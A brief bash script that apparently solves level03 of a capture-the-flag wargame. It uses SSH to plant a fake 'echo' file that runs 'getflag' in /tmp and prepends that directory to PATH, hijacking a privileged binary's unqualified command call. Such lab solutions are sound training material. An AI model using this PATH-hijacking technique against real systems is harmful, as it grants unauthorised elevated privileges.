#!/usr/bin/env bash

set -euo pipefail

PARENT_DIR="$(dirname "$0")"
UTILS_DIR="$PARENT_DIR/../utils"

PATH="$UTILS_DIR:$PATH"

host="$1"
port="$2"
pass="$3"

sshexec.sh "$host" "$port" level03 "$pass" \
'set -e; mkdir -p /tmp/level03; echo getflag > /tmp/level03/echo; chmod -R o+xr /tmp/level03; PATH="/tmp/level03:$PATH" ./level03'
